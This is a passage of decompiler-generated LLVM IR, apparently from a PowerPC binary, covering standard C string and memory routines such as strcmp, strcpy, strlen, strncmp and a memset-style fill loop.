  store i32 %v1_100071b0, i32* %r9.global-to-local, align 4
  %v4_100071b0 = icmp eq i32 %v1_100071b0, 0
  br i1 %v4_100071b0, label %dec_label_pc_100071d8, label %dec_label_pc_100071b8

dec_label_pc_100071b8:                            ; preds = %dec_label_pc_100071a0
  %v0_100071b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100071b8 = urem i32 %v0_100071b8, 4
  %v3_100071b8 = icmp eq i32 %v1_100071b8, 0
  br i1 %v3_100071b8, label %dec_label_pc_100071c0, label %dec_label_pc_10007208

dec_label_pc_100071c0:                            ; preds = %dec_label_pc_10007220.dec_label_pc_100071c0_crit_edge, %dec_label_pc_100071b8
  %v0_100071c4.pre = phi i32 [ %v0_100071c4.pre.pre, %dec_label_pc_10007220.dec_label_pc_100071c0_crit_edge ], [ %v0_100071b8, %dec_label_pc_100071b8 ]
  %v0_100071c0 = phi i32 [ %v1_10007220, %dec_label_pc_10007220.dec_label_pc_100071c0_crit_edge ], [ %v1_100071b0, %dec_label_pc_100071b8 ]
  store i32 %v0_100071c0, i32* %ctr.global-to-local, align 4
  %v1_100071c8 = sext i8 %v2_100071ac to i32
  br label %dec_label_pc_100071c4

dec_label_pc_100071c4:                            ; preds = %dec_label_pc_100071c4, %dec_label_pc_100071c0
  %v0_100071c4 = phi i32 [ %v1_100071d0, %dec_label_pc_100071c4 ], [ %v0_100071c4.pre, %dec_label_pc_100071c0 ]
  %v1_100071c4 = add i32 %v0_100071c4, 4
  store i32 %v1_100071c4, i32* %r9.global-to-local, align 4
  %v4_100071c8 = inttoptr i32 %v1_100071c4 to i32*
  store i32 %v1_100071c8, i32* %v4_100071c8, align 4
  %v2_100071cc = load i32, i32* %r9.global-to-local, align 4
  %v3_100071cc = add i32 %v2_100071cc, 4
  %v4_100071cc = inttoptr i32 %v3_100071cc to i32*
  store i32 %v1_100071c8, i32* %v4_100071cc, align 4
  %v0_100071d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100071d0 = add i32 %v0_100071d0, 4
  store i32 %v1_100071d0, i32* %r11.global-to-local, align 4
  %v0_100071d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100071d4 = add i32 %v0_100071d4, -1
  store i32 %v1_100071d4, i32* %ctr.global-to-local, align 4
  %v2_100071d4 = icmp eq i32 %v1_100071d4, 0
  br i1 %v2_100071d4, label %dec_label_pc_100071d8, label %dec_label_pc_100071c4

dec_label_pc_100071d8:                            ; preds = %dec_label_pc_100071c4, %dec_label_pc_10007220, %dec_label_pc_100071a0
  %v0_100071d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100071d8 = urem i32 %v0_100071d8, 8
  store i32 %v1_100071d8, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_100071d8, 4
  br i1 %tmp, label %dec_label_pc_100071ec, label %dec_label_pc_100071e4

dec_label_pc_100071e4:                            ; preds = %dec_label_pc_100071d8
  %v1_100071e4 = sext i8 %v2_100071ac to i32
  %v2_100071e4 = load i32, i32* %r11.global-to-local, align 4
  %v3_100071e4 = add i32 %v2_100071e4, 4
  %v4_100071e4 = inttoptr i32 %v3_100071e4 to i32*
  store i32 %v1_100071e4, i32* %v4_100071e4, align 4
  store i32 %v3_100071e4, i32* %r11.global-to-local, align 4
  %v0_100071e8 = load i32, i32* @r5, align 4
  %v1_100071e8 = add i32 %v0_100071e8, -4
  store i32 %v1_100071e8, i32* @r5, align 4
  br label %dec_label_pc_100071ec

dec_label_pc_100071ec:                            ; preds = %dec_label_pc_100071d8, %dec_label_pc_100071e4
  %v0_100071ec = phi i32 [ %v1_100071d8, %dec_label_pc_100071d8 ], [ %v1_100071e8, %dec_label_pc_100071e4 ]
  %v3_100071ec = icmp eq i32 %v0_100071ec, 0
  %v0_100071f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100071ec, i32 %v0_100071f0)
  %v0_100071f4 = load i32, i32* @r5, align 4
  store i32 %v0_100071f4, i32* %ctr.global-to-local, align 4
  %v0_100071f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100071f8 = add i32 %v0_100071f8, 3
  store i32 %v1_100071f8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100071fc

dec_label_pc_100071fc:                            ; preds = %dec_label_pc_100071fc, %dec_label_pc_100071ec
  %v3_100071fc = phi i32 [ %v4_100071fc, %dec_label_pc_100071fc ], [ %v1_100071f8, %dec_label_pc_100071ec ]
  %v4_100071fc = add i32 %v3_100071fc, 1
  %v5_100071fc = inttoptr i32 %v4_100071fc to i8*
  store i8 %v2_100071ac, i8* %v5_100071fc, align 1
  store i32 %v4_100071fc, i32* %r9.global-to-local, align 4
  %v0_10007200 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007200 = add i32 %v0_10007200, -1
  store i32 %v1_10007200, i32* %ctr.global-to-local, align 4
  %v2_10007200 = icmp eq i32 %v1_10007200, 0
  br i1 %v2_10007200, label %dec_label_pc_1000722c, label %dec_label_pc_100071fc

dec_label_pc_10007208:                            ; preds = %dec_label_pc_100071b8
  %v1_10007208 = sub nsw i32 4, %v1_100071b8
  store i32 %v1_10007208, i32* %ctr.global-to-local, align 4
  %v1_10007210 = load i32, i32* %r5.global-to-local, align 4
  %v2_10007210 = sub i32 %v1_10007210, %v1_10007208
  store i32 %v2_10007210, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007214

dec_label_pc_10007214:                            ; preds = %dec_label_pc_10007214, %dec_label_pc_10007208
  %v3_10007214 = phi i32 [ %v1_10007218, %dec_label_pc_10007214 ], [ %v0_100071b8, %dec_label_pc_10007208 ]
  %v4_10007214 = add i32 %v3_10007214, 4
  %v5_10007214 = inttoptr i32 %v4_10007214 to i8*
  store i8 %v2_100071ac, i8* %v5_10007214, align 1
  %v0_10007218 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007218 = add i32 %v0_10007218, 1
  store i32 %v1_10007218, i32* %r11.global-to-local, align 4
  %v0_1000721c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000721c = add i32 %v0_1000721c, -1
  store i32 %v1_1000721c, i32* %ctr.global-to-local, align 4
  %v2_1000721c = icmp eq i32 %v1_1000721c, 0
  br i1 %v2_1000721c, label %dec_label_pc_10007220, label %dec_label_pc_10007214

dec_label_pc_10007220:                            ; preds = %dec_label_pc_10007214
  %v0_10007220 = load i32, i32* %r5.global-to-local, align 4
  %v1_10007220 = call i32 @__asm_rlwinm.(i32 %v0_10007220, i32 29, i32 3, i32 31)
  store i32 %v1_10007220, i32* %r9.global-to-local, align 4
  %v4_10007220 = icmp eq i32 %v1_10007220, 0
  br i1 %v4_10007220, label %dec_label_pc_100071d8, label %dec_label_pc_10007220.dec_label_pc_100071c0_crit_edge

dec_label_pc_10007220.dec_label_pc_100071c0_crit_edge: ; preds = %dec_label_pc_10007220
  %v0_100071c4.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100071c0

dec_label_pc_1000722c:                            ; preds = %dec_label_pc_100071fc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10007220, { 1, 2, 0 }
  uselistorder i32 %v1_1000721c, { 1, 0 }
  uselistorder i32 %v1_10007218, { 1, 0 }
  uselistorder i32 %v1_10007200, { 1, 0 }
  uselistorder i32 %v4_100071fc, { 1, 2, 0 }
  uselistorder i32 %v1_100071d8, { 2, 1, 0 }
  uselistorder i32 %v1_100071d4, { 1, 0 }
  uselistorder i32 %v1_100071d0, { 1, 0 }
  uselistorder i32 %v1_100071b8, { 1, 0 }
  uselistorder i32 %v0_100071b8, { 2, 1, 0 }
  uselistorder i8 %v2_100071ac, { 3, 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_100071ec, { 1, 0 }
  uselistorder label %dec_label_pc_100071d8, { 1, 0, 2 }
}

define i32 @function_10007230(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007230:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000723c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007234

dec_label_pc_10007234:                            ; preds = %dec_label_pc_10007258, %dec_label_pc_10007230
  %v0_1000723c = phi i32 [ %v1_10007240, %dec_label_pc_10007258 ], [ %v0_1000723c.pre, %dec_label_pc_10007230 ]
  %v0_10007234 = phi i32 [ %v1_10007238, %dec_label_pc_10007258 ], [ %tmp, %dec_label_pc_10007230 ]
  %v1_10007234 = inttoptr i32 %v0_10007234 to i8*
  %v2_10007234 = load i8, i8* %v1_10007234, align 1
  %v3_10007234 = zext i8 %v2_10007234 to i32
  %v1_1000723c = inttoptr i32 %v0_1000723c to i8*
  %v2_1000723c = load i8, i8* %v1_1000723c, align 1
  %v3_1000723c = zext i8 %v2_1000723c to i32
  %v3_10007244 = icmp eq i8 %v2_10007234, 0
  br i1 %v3_10007244, label %dec_label_pc_10007250, label %dec_label_pc_10007258

dec_label_pc_10007250:                            ; preds = %dec_label_pc_10007234
  %v1_10007250 = sub nsw i32 0, %v3_1000723c
  ret i32 %v1_10007250

dec_label_pc_10007258:                            ; preds = %dec_label_pc_10007234
  %v4_10007248 = icmp eq i8 %v2_10007234, %v2_1000723c
  %v1_10007240 = add i32 %v0_1000723c, 1
  %v1_10007238 = add i32 %v0_10007234, 1
  br i1 %v4_10007248, label %dec_label_pc_10007234, label %dec_label_pc_1000725c

dec_label_pc_1000725c:                            ; preds = %dec_label_pc_10007258
  %v2_1000725c = sub nsw i32 %v3_10007234, %v3_1000723c
  ret i32 %v2_1000725c

; uselistorder directives
  uselistorder i32 %v3_1000723c, { 1, 0 }
  uselistorder i32 %v0_10007234, { 1, 0 }
  uselistorder i32 %v0_1000723c, { 1, 0 }
}

define i32 @function_10007264(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10007264:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10007264 = add i32 %arg1, -1
  %v1_10007268 = sub i32 %v2_10007264, %tmp
  store i32 %v1_10007268, i32* %r9.global-to-local, align 4
  %v2_1000726c4 = load i8, i8* %arg2, align 1
  %v1_100072706 = add i32 %tmp, 1
  store i32 %v1_100072706, i32* %r4.global-to-local, align 4
  %v3_100072748 = icmp eq i8 %v2_1000726c4, 0
  store i1 %v3_100072748, i1* %cr7_eq.global-to-local, align 1
  %v5_100072789 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000726c4, i8* %v5_100072789, align 1
  %v0_1000727c10 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000727c10, label %dec_label_pc_10007280, label %dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge

dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge: ; preds = %dec_label_pc_10007264, %dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge
  %v0_1000726c.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10007278.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000726c = inttoptr i32 %v0_1000726c.pre to i8*
  %v2_1000726c = load i8, i8* %v1_1000726c, align 1
  %v1_10007270 = add i32 %v0_1000726c.pre, 1
  store i32 %v1_10007270, i32* %r4.global-to-local, align 4
  %v3_10007274 = icmp eq i8 %v2_1000726c, 0
  store i1 %v3_10007274, i1* %cr7_eq.global-to-local, align 1
  %v4_10007278 = add i32 %v1_10007270, %v2_10007278.pre
  %v5_10007278 = inttoptr i32 %v4_10007278 to i8*
  store i8 %v2_1000726c, i8* %v5_10007278, align 1
  %v0_1000727c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000727c, label %dec_label_pc_10007280, label %dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge

dec_label_pc_10007280:                            ; preds = %dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge, %dec_label_pc_10007264
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000726c.dec_label_pc_1000726c_crit_edge, { 1, 0 }
}

define i32 @function_10007284() local_unnamed_addr {
dec_label_pc_10007284:
  %v0_10007284 = load i32, i32* @r3, align 4
  %v1_1000729c3 = urem i32 %v0_10007284, 4
  %v3_1000729c5 = icmp eq i32 %v1_1000729c3, 0
  br i1 %v3_1000729c5, label %dec_label_pc_100072a4, label %dec_label_pc_1000728c

dec_label_pc_1000728c:                            ; preds = %dec_label_pc_10007284, %dec_label_pc_10007298
  %v0_10007298 = phi i32 [ %v1_10007298, %dec_label_pc_10007298 ], [ %v0_10007284, %dec_label_pc_10007284 ]
  %v1_1000728c = inttoptr i32 %v0_10007298 to i8*
  %v2_1000728c = load i8, i8* %v1_1000728c, align 1
  %v3_10007290 = icmp eq i8 %v2_1000728c, 0
  br i1 %v3_10007290, label %dec_label_pc_100072d8, label %dec_label_pc_10007298

dec_label_pc_10007298:                            ; preds = %dec_label_pc_1000728c
  %v1_10007298 = add i32 %v0_10007298, 1
  %v1_1000729c = urem i32 %v1_10007298, 4
  %v3_1000729c = icmp eq i32 %v1_1000729c, 0
  br i1 %v3_1000729c, label %dec_label_pc_100072a4, label %dec_label_pc_1000728c

dec_label_pc_100072a4:                            ; preds = %dec_label_pc_10007298, %dec_label_pc_10007284
  %v0_100072a8 = phi i32 [ %v0_10007284, %dec_label_pc_10007284 ], [ %v1_10007298, %dec_label_pc_10007298 ]
  br label %dec_label_pc_100072b0

dec_label_pc_100072b0:                            ; preds = %dec_label_pc_10007310, %dec_label_pc_100072b0, %dec_label_pc_100072a4
  %v1_100072ec = phi i32 [ %v0_100072a8, %dec_label_pc_100072a4 ], [ %v1_100072b4, %dec_label_pc_100072b0 ], [ %v1_100072b4, %dec_label_pc_10007310 ]
  %v1_100072b0 = inttoptr i32 %v1_100072ec to i32*
  %v2_100072b0 = load i32, i32* %v1_100072b0, align 4
  %v1_100072b4 = add i32 %v1_100072ec, 4
  %v1_100072c0 = add i32 %v2_100072b0, -16843009
  %v2_100072c4 = and i32 %v1_100072c0, -2139062144
  %v5_100072c4 = icmp eq i32 %v2_100072c4, 0
  br i1 %v5_100072c4, label %dec_label_pc_100072b0, label %dec_label_pc_100072cc

dec_label_pc_100072cc:                            ; preds = %dec_label_pc_100072b0
  %v2_100072cc = inttoptr i32 %v1_100072ec to i8*
  %v3_100072cc = load i8, i8* %v2_100072cc, align 1
  %v3_100072d0 = icmp eq i8 %v3_100072cc, 0
  br i1 %v3_100072d0, label %dec_label_pc_100072d8, label %dec_label_pc_100072e0

dec_label_pc_100072d8:                            ; preds = %dec_label_pc_1000728c, %dec_label_pc_100072cc
  %v1_100072d8 = phi i32 [ %v1_100072ec, %dec_label_pc_100072cc ], [ %v0_10007298, %dec_label_pc_1000728c ]
  %v2_100072d8 = sub i32 %v1_100072d8, %v0_10007284
  ret i32 %v2_100072d8

dec_label_pc_100072e0:                            ; preds = %dec_label_pc_100072cc
  %v1_100072e0 = add i32 %v1_100072ec, 1
  %v2_100072e0 = inttoptr i32 %v1_100072e0 to i8*
  %v3_100072e0 = load i8, i8* %v2_100072e0, align 1
  %v3_100072e4 = icmp eq i8 %v3_100072e0, 0
  br i1 %v3_100072e4, label %dec_label_pc_100072ec, label %dec_label_pc_100072f8

dec_label_pc_100072ec:                            ; preds = %dec_label_pc_100072e0
  %v2_100072ec = sub i32 %v1_100072ec, %v0_10007284
  %v1_100072f0 = add i32 %v2_100072ec, 1
  ret i32 %v1_100072f0

dec_label_pc_100072f8:                            ; preds = %dec_label_pc_100072e0
  %v1_100072f8 = add i32 %v1_100072ec, 2
  %v2_100072f8 = inttoptr i32 %v1_100072f8 to i8*
  %v3_100072f8 = load i8, i8* %v2_100072f8, align 1
  %v3_100072fc = icmp eq i8 %v3_100072f8, 0
  br i1 %v3_100072fc, label %dec_label_pc_10007304, label %dec_label_pc_10007310

dec_label_pc_10007304:                            ; preds = %dec_label_pc_100072f8
  %v2_10007304 = sub i32 %v1_100072ec, %v0_10007284
  %v1_10007308 = add i32 %v2_10007304, 2
  ret i32 %v1_10007308

dec_label_pc_10007310:                            ; preds = %dec_label_pc_100072f8
  %v1_10007310 = add i32 %v1_100072ec, 3
  %v2_10007310 = inttoptr i32 %v1_10007310 to i8*
  %v3_10007310 = load i8, i8* %v2_10007310, align 1
  %v3_10007314 = icmp eq i8 %v3_10007310, 0
  br i1 %v3_10007314, label %dec_label_pc_1000731c, label %dec_label_pc_100072b0

dec_label_pc_1000731c:                            ; preds = %dec_label_pc_10007310
  %v2_1000731c = sub i32 %v1_100072ec, %v0_10007284
  %v1_10007320 = add i32 %v2_1000731c, 3
  ret i32 %v1_10007320

; uselistorder directives
  uselistorder i32 %v1_100072b4, { 1, 0 }
  uselistorder i32 %v1_100072ec, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10007298, { 1, 0, 2 }
  uselistorder i32 %v0_10007284, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100072d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000728c, { 1, 0 }
}

define i32 @function_10007328(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007328:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_10007400, label %dec_label_pc_1000733c

dec_label_pc_1000733c:                            ; preds = %dec_label_pc_10007328
  %v1_1000733c = udiv i32 %arg2, 4
  %v0_1000734c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007344

dec_label_pc_10007344:                            ; preds = %dec_label_pc_100073cc, %dec_label_pc_1000733c
  %v0_100073cc = phi i32 [ %v1_100073cc, %dec_label_pc_100073cc ], [ %v1_1000733c, %dec_label_pc_1000733c ]
  %v0_10007364 = phi i32 [ %v1_10007388, %dec_label_pc_100073cc ], [ %v0_1000734c.pre, %dec_label_pc_1000733c ]
  %v0_10007360 = phi i32 [ %v1_1000737c, %dec_label_pc_100073cc ], [ %tmp, %dec_label_pc_1000733c ]
  %v1_10007344 = inttoptr i32 %v0_10007360 to i8*
  %v2_10007344 = load i8, i8* %v1_10007344, align 1
  %v1_1000734c = inttoptr i32 %v0_10007364 to i8*
  %v2_1000734c = load i8, i8* %v1_1000734c, align 1
  %v3_10007350 = icmp eq i8 %v2_10007344, 0
  %v4_10007354.not = icmp ne i8 %v2_10007344, %v2_1000734c
  %brmerge = or i1 %v3_10007350, %v4_10007354.not
  br i1 %brmerge, label %dec_label_pc_100073ac, label %dec_label_pc_10007360

dec_label_pc_10007360:                            ; preds = %dec_label_pc_10007344
  %v1_10007348 = add i32 %v0_10007360, 1
  %v2_10007360 = inttoptr i32 %v1_10007348 to i8*
  %v3_10007360 = load i8, i8* %v2_10007360, align 1
  %v1_10007364 = add i32 %v0_10007364, 1
  %v2_10007368 = inttoptr i32 %v1_10007364 to i8*
  %v3_10007368 = load i8, i8* %v2_10007368, align 1
  %v3_10007378 = icmp eq i8 %v3_10007360, 0
  %v1_1000737c = add i32 %v0_10007360, 4
  %v1_10007380 = add i32 %v0_10007364, 3
  %v1_10007388 = add i32 %v0_10007364, 4
  store i32 %v1_10007388, i32* @r4, align 4
  %v4_10007384.not = icmp ne i8 %v3_10007360, %v3_10007368
  %brmerge20 = or i1 %v3_10007378, %v4_10007384.not
  br i1 %brmerge20, label %dec_label_pc_100073ac, label %dec_label_pc_10007394

dec_label_pc_10007394:                            ; preds = %dec_label_pc_10007360
  %v1_10007374 = add i32 %v0_10007364, 2
  %v1_1000736c = add i32 %v0_10007360, 2
  %v2_10007394 = inttoptr i32 %v1_1000736c to i8*
  %v3_10007394 = load i8, i8* %v2_10007394, align 1
  %v2_10007398 = inttoptr i32 %v1_10007374 to i8*
  %v3_10007398 = load i8, i8* %v2_10007398, align 1
  %v3_1000739c = icmp eq i8 %v3_10007394, 0
  %v4_100073a0.not = icmp ne i8 %v3_10007394, %v3_10007398
  %brmerge1 = or i1 %v3_1000739c, %v4_100073a0.not
  br i1 %brmerge1, label %dec_label_pc_100073ac, label %dec_label_pc_100073b4

dec_label_pc_100073ac:                            ; preds = %dec_label_pc_10007360, %dec_label_pc_10007394, %dec_label_pc_10007344
  %v1_100073ac.in = phi i8 [ %v3_10007394, %dec_label_pc_10007394 ], [ %v2_10007344, %dec_label_pc_10007344 ], [ %v3_10007360, %dec_label_pc_10007360 ]
  %v0_100073ac.in = phi i8 [ %v3_10007398, %dec_label_pc_10007394 ], [ %v2_1000734c, %dec_label_pc_10007344 ], [ %v3_10007368, %dec_label_pc_10007360 ]
  %v0_100073ac = zext i8 %v0_100073ac.in to i32
  %v1_100073ac = zext i8 %v1_100073ac.in to i32
  %v2_100073ac = sub nsw i32 %v1_100073ac, %v0_100073ac
  ret i32 %v2_100073ac

dec_label_pc_100073b4:                            ; preds = %dec_label_pc_10007394
  %v1_100073b4 = add i32 %v0_10007360, 3
  %v2_100073b4 = inttoptr i32 %v1_100073b4 to i8*
  %v3_100073b4 = load i8, i8* %v2_100073b4, align 1
  %v4_100073b4 = zext i8 %v3_100073b4 to i32
  %v2_100073b8 = inttoptr i32 %v1_10007380 to i8*
  %v3_100073b8 = load i8, i8* %v2_100073b8, align 1
  %v4_100073b8 = zext i8 %v3_100073b8 to i32
  %v3_100073bc = icmp eq i8 %v3_100073b4, 0
  %v4_100073c0.not = icmp ne i8 %v3_100073b4, %v3_100073b8
  %brmerge2 = or i1 %v3_100073bc, %v4_100073c0.not
  br i1 %brmerge2, label %dec_label_pc_100073f8, label %dec_label_pc_100073cc

dec_label_pc_100073cc:                            ; preds = %dec_label_pc_100073b4
  %v1_100073cc = add i32 %v0_100073cc, -1
  %v2_100073cc = icmp eq i32 %v1_100073cc, 0
  br i1 %v2_100073cc, label %dec_label_pc_100073d0, label %dec_label_pc_10007344

dec_label_pc_100073d0:                            ; preds = %dec_label_pc_100073cc
  %v1_100073d0 = urem i32 %arg2, 4
  br label %dec_label_pc_10007400

dec_label_pc_100073d8:                            ; preds = %dec_label_pc_10007408
  %v1_100073d8 = inttoptr i32 %v0_100073d8 to i8*
  %v2_100073d8 = load i8, i8* %v1_100073d8, align 1
  %v3_100073d8 = zext i8 %v2_100073d8 to i32
  %v1_100073dc = add i32 %v0_100073d8, 1
  %v0_100073e0 = load i32, i32* @r4, align 4
  %v1_100073e0 = inttoptr i32 %v0_100073e0 to i8*
  %v2_100073e0 = load i8, i8* %v1_100073e0, align 1
  %v3_100073e0 = zext i8 %v2_100073e0 to i32
  %v1_100073e4 = add i32 %v0_100073e0, 1
  store i32 %v1_100073e4, i32* @r4, align 4
  %v3_100073e8 = icmp eq i8 %v2_100073d8, 0
  %v4_100073ec.not = icmp ne i8 %v2_100073d8, %v2_100073e0
  %brmerge3 = or i1 %v3_100073e8, %v4_100073ec.not
  br i1 %brmerge3, label %dec_label_pc_100073f8, label %dec_label_pc_10007408

dec_label_pc_100073f8:                            ; preds = %dec_label_pc_100073b4, %dec_label_pc_100073d8
  %v1_100073f8 = phi i32 [ %v3_100073d8, %dec_label_pc_100073d8 ], [ %v4_100073b4, %dec_label_pc_100073b4 ]
  %v0_100073f8 = phi i32 [ %v3_100073e0, %dec_label_pc_100073d8 ], [ %v4_100073b8, %dec_label_pc_100073b4 ]
  %v2_100073f8 = sub nsw i32 %v1_100073f8, %v0_100073f8
  ret i32 %v2_100073f8

dec_label_pc_10007400:                            ; preds = %dec_label_pc_10007328, %dec_label_pc_100073d0
  %v1_1000740c19 = phi i32 [ 0, %dec_label_pc_10007328 ], [ %v4_100073b4, %dec_label_pc_100073d0 ]
  %v0_1000740c17 = phi i32 [ 0, %dec_label_pc_10007328 ], [ %v4_100073b8, %dec_label_pc_100073d0 ]
  %v0_100073d813 = phi i32 [ %tmp, %dec_label_pc_10007328 ], [ %v1_1000737c, %dec_label_pc_100073d0 ]
  %v0_10007400 = phi i32 [ %arg2, %dec_label_pc_10007328 ], [ %v1_100073d0, %dec_label_pc_100073d0 ]
  %v1_10007400 = add i32 %v0_10007400, 1
  br label %dec_label_pc_10007408

dec_label_pc_10007408:                            ; preds = %dec_label_pc_100073d8, %dec_label_pc_10007400
  %v1_1000740c = phi i32 [ %v3_100073d8, %dec_label_pc_100073d8 ], [ %v1_1000740c19, %dec_label_pc_10007400 ]
  %v0_1000740c = phi i32 [ %v3_100073e0, %dec_label_pc_100073d8 ], [ %v0_1000740c17, %dec_label_pc_10007400 ]
  %v0_100073d8 = phi i32 [ %v1_100073dc, %dec_label_pc_100073d8 ], [ %v0_100073d813, %dec_label_pc_10007400 ]
  %v0_10007408 = phi i32 [ %v1_10007408, %dec_label_pc_100073d8 ], [ %v1_10007400, %dec_label_pc_10007400 ]
  %v1_10007408 = add i32 %v0_10007408, -1
  %v2_10007408 = icmp eq i32 %v1_10007408, 0
  br i1 %v2_10007408, label %dec_label_pc_1000740c, label %dec_label_pc_100073d8

dec_label_pc_1000740c:                            ; preds = %dec_label_pc_10007408
  %v2_1000740c = sub nsw i32 %v1_1000740c, %v0_1000740c
  ret i32 %v2_1000740c

; uselistorder directives
  uselistorder i32 %v1_10007408, { 1, 0 }
  uselistorder i32 %v3_100073e0, { 1, 0 }
  uselistorder i32 %v3_100073d8, { 1, 0 }
  uselistorder i32 %v1_100073cc, { 1, 0 }
  uselistorder i32 %v4_100073b8, { 1, 0 }
  uselistorder i32 %v4_100073b4, { 1, 0 }
  uselistorder i32 %v1_10007388, { 1, 0 }
  uselistorder i32 %v0_10007360, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_10007364, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10007408, { 1, 0 }
  uselistorder label %dec_label_pc_10007400, { 1, 0 }
  uselistorder label %dec_label_pc_100073f8, { 1, 0 }
  uselistorder label %dec_label_pc_100073ac, { 1, 0, 2 }
}

define i32 @function_10007414(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007414:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_10007414 = icmp eq i32 %arg2, 3
  store i1 %v3_10007414, i1* %cr7_eq.global-to-local, align 1
  %v1_10007418 = add i32 %arg1, -1
  store i32 %v1_10007418, i32* %r10.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10007494, label %dec_label_pc_10007420

dec_label_pc_10007420:                            ; preds = %dec_label_pc_10007414
  %v1_10007420 = udiv i32 %arg2, 4
  store i32 %v1_10007420, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007428

dec_label_pc_10007428:                            ; preds = %dec_label_pc_10007478, %dec_label_pc_10007420
  %v2_10007438 = phi i32 [ %v3_10007470, %dec_label_pc_10007478 ], [ %v1_10007418, %dec_label_pc_10007420 ]
  %v0_10007428 = load i32, i32* @r4, align 4
  %v1_10007428 = inttoptr i32 %v0_10007428 to i8*
  %v2_10007428 = load i8, i8* %v1_10007428, align 1
  %v1_1000742c = add i32 %v0_10007428, 1
  store i32 %v1_1000742c, i32* %r11.global-to-local, align 4
  %v1_10007430 = add i32 %v0_10007428, 2
  store i32 %v1_10007430, i32* %r8.global-to-local, align 4
  %v3_10007434 = icmp eq i8 %v2_10007428, 0
  store i1 %v3_10007434, i1* %cr7_eq.global-to-local, align 1
  %v3_10007438 = add i32 %v2_10007438, 1
  %v4_10007438 = inttoptr i32 %v3_10007438 to i8*
  store i8 %v2_10007428, i8* %v4_10007438, align 1
  store i32 %v3_10007438, i32* %r10.global-to-local, align 4
  %v0_1000743c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000743c, label %dec_label_pc_10007480, label %dec_label_pc_10007440

dec_label_pc_10007440:                            ; preds = %dec_label_pc_10007428
  %v0_10007440 = load i32, i32* @r4, align 4
  %v1_10007440 = add i32 %v0_10007440, 1
  %v2_10007440 = inttoptr i32 %v1_10007440 to i8*
  %v3_10007440 = load i8, i8* %v2_10007440, align 1
  %v0_10007444 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007448 = add i32 %v0_10007444, 2
  store i32 %v1_10007448, i32* @r4, align 4
  %v3_1000744c = icmp eq i8 %v3_10007440, 0
  store i1 %v3_1000744c, i1* %cr7_eq.global-to-local, align 1
  %v3_10007450 = add i32 %v2_10007438, 2
  %v4_10007450 = inttoptr i32 %v3_10007450 to i8*
  store i8 %v3_10007440, i8* %v4_10007450, align 1
  store i32 %v3_10007450, i32* %r10.global-to-local, align 4
  %v0_10007454 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007454, label %dec_label_pc_10007480, label %dec_label_pc_10007458

dec_label_pc_10007458:                            ; preds = %dec_label_pc_10007440
  %v0_10007458 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007458 = add i32 %v0_10007458, 1
  %v2_10007458 = inttoptr i32 %v1_10007458 to i8*
